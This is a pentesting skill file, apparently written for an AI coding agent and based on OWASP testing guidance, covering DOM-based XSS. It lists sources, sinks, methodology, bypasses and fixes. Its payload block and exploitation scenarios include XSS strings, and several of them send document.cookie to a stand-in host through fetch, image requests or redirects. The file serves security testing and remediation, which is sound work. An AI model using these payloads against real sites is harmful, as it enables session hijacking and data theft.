---
name: dom-xss
description: >
  DOM-based XSS occurs when JavaScript reads attacker-controlled sources (`location.hash`, `document.referrer`, `window.name`, `location.search`) and passes them to dangerous sinks (`document.write`, `innerHTML`, `eval`, `location.href`, `setTimeout`, `jQuery.html()`) without sanitization. Unlike reflected/stored XSS, payloads never reach the server. Detect by auditing JavaScript for tainted data flow from DOM sources to sinks. Tools: Burp Suite DOM Invader, Chrome DevTools, DOMPurify (fix).
license: MIT
compatibility: Designed for Claude Code. Requires Burp Suite with DOM Invader, or manual JavaScript review via browser DevTools.
metadata:
  category: client-side
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-CLNT-01
---

# DOM-Based Cross-Site Scripting (XSS)

## What Is Broken and Why
DOM XSS arises when client-side JavaScript takes data from a controllable source (URL fragment, query string, referrer, postMessage, cookie) and writes it to a dangerous sink that interprets HTML or executes code, all without the data ever being sent to or processed by the server. This means server-side output encoding does not prevent it, and proxy-based scanners may miss it entirely. The root cause is JavaScript treating user-controlled DOM properties as trusted content.

## Key Signals
- JavaScript reading from: `location.hash`, `location.search`, `location.href`, `document.referrer`, `window.name`, `document.cookie`, `postMessage` event data
- JavaScript writing to: `document.write()`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `location.href = ...`, `src` attribute assignment, `jQuery.html()`, `jQuery.append()`
- Single-page applications (SPAs) with client-side routing
- JavaScript dynamically building page content from URL parameters
- Event handler attributes set from JavaScript using string-based eval-equivalent constructs

## Methodology
1. Crawl the application and collect all JavaScript files, inline scripts, and event handlers.
2. Search for DOM source references: `location.hash`, `location.search`, `document.referrer`, `window.name`.
3. Trace data flow from each source to identify all sinks it reaches.
4. Identify the context in which the sink operates (HTML, JavaScript, URL, CSS).
5. Craft a context-appropriate payload and deliver via the controllable source.
6. Test in a real browser — automated tools miss browser-behavior-dependent execution.
7. Pay attention to: script execution in event handlers, off-site CSS/script includes, SPA route handling.

## Payloads & Tools
```
# Fragment-based DOM XSS (payload never sent to server)
TARGET/page#<script>alert(1)</script>
TARGET/page#<img src=x onerror=alert(document.cookie)>

# Hash-based with document.write sink
# Vulnerable code: document.write("Location: " + document.location.href)
TARGET/page#<script>alert(1)</script>

# innerHTML sink via URL parameter
# Vulnerable code: document.getElementById('x').innerHTML = location.hash.substring(1)
TARGET/page#<img src=x onerror=alert(1)>

# eval() sink
# Vulnerable code: eval('var x = "' + location.hash.substring(1) + '"')
TARGET/page#"; alert(1); var y="

# location.href sink (open redirect + XSS)
# Vulnerable code: window.location = decodeURIComponent(location.hash.substring(1))
TARGET/page#javascript:alert(document.cookie)

# jQuery .html() sink
TARGET/page?search=<img src=x onerror=alert(1)>

# document.write with script src
TARGET/page?lang=<script src=//VICTIM/xss.js>

# window.name trick (survives navigation)
# Attacker page sets: window.name = "<img src=x onerror=alert(1)>"
# Victim app reads: document.getElementById('x').innerHTML = window.name

# postMessage XSS
# Attacker sends: targetWindow.postMessage("<img src=x onerror=alert(1)>", "*")
# Victim app: window.addEventListener("message", (e) => { div.innerHTML = e.data; })

# Burp DOM Invader
# Enable in Burp's embedded browser -> Extensions -> DOM Invader
# Automatically injects canary into all sources and monitors sinks

# Manual Chrome DevTools approach
# Sources tab: search all JS for: innerHTML, document.write, eval, location
# Console: monitor with: Object.defineProperty(document, 'cookie', {get: () => {debugger; return ''}})
```

## Bypass Techniques
- Fragment (`#`) payloads are not sent to server, bypassing server-side WAFs and filters
- `javascript:` URI scheme in href/src sinks when `<script>` tags are filtered
- Event handlers in injected HTML: `<img onerror=...>`, `<svg onload=...>`, `<body onpageshow=...>`
- `innerHTML` does not execute `<script>` tags directly — use event handler payloads instead
- Encoding in fragment: `%3Cscript%3E` may be decoded by `decodeURIComponent()` before reaching sink
- `window.name` persists across cross-origin navigations — attacker page can set it
- `postMessage` with missing or weak origin validation (see web messaging skill)
- Template literal injection in modern JS: `eval(\`${userInput}\`)`

## Exploitation Scenarios
**Scenario 1 — Fragment Injection via document.write**
Setup: SPA reads `location.hash` to display a "you came from" breadcrumb using `document.write()`.
Trigger: Victim clicks attacker link: `TARGET/dashboard#<script>new Image().src='http://VICTIM/c?x='+document.cookie</script>`
Impact: Session cookie exfiltrated to attacker; payload never touches server, bypasses WAF.

**Scenario 2 — eval() Injection via Search Parameter**
Setup: JavaScript parses `location.search` and uses `eval()` to set a variable from the `theme` parameter.
Trigger: `TARGET/page?theme=dark";fetch('http://VICTIM/?c='+document.cookie);//`
Impact: Arbitrary JavaScript executed; session stolen.

**Scenario 3 — innerHTML Sink via jQuery**
Setup: jQuery-based page loads product description from `#description` fragment into `$('#content').html()`.
Trigger: `TARGET/product#<img src=x onerror="document.location='http://VICTIM/steal?c='+document.cookie">`
Impact: Cookie exfiltration; attacker can perform any action as the victim user.

## False Positives
- Payload in fragment reflected in source but not reaching a dangerous sink (rendered as text only)
- `innerHTML` assigned a value that is HTML-encoded before assignment (escaping happening in JS)
- DOMPurify or similar sanitizer stripping dangerous content before sink assignment
- CSP blocking inline script execution even when payload reaches sink
- `eval()` present in code but receiving only developer-controlled or whitelisted input

## Fix Patterns
- Use `textContent` or `innerText` instead of `innerHTML` when inserting user-controlled data as plain text
- When HTML insertion is required, sanitize with DOMPurify: `element.innerHTML = DOMPurify.sanitize(userInput)`
- Avoid `eval()`, `setTimeout(string)`, `setInterval(string)` with user-controlled data
- Validate and sanitize `postMessage` event data; always check `event.origin` before processing
- For URL redirects: use an allowlist of permitted destinations; never pass `javascript:` to `location.href`
- Content Security Policy: `script-src 'self'` prevents execution of injected scripts
- Use frameworks with auto-escaping (React, Angular) which avoid direct DOM manipulation by default

## Related Skills

DOM XSS is a distinct exploit path from [[xss-reflected]] and [[xss-stored]] because the payload never reaches the server — a purely client-side taint flow. [[cspt]] frequently lands in a DOM XSS sink: a path traversal that redirects a `fetch()` to an attacker-controlled URL can return a payload that gets written to `innerHTML`. A [[cors-misconfig]] that lets cross-origin reads succeed enables exfiltrating data from DOM XSS contexts by relaying the stolen content through the attacker's domain.
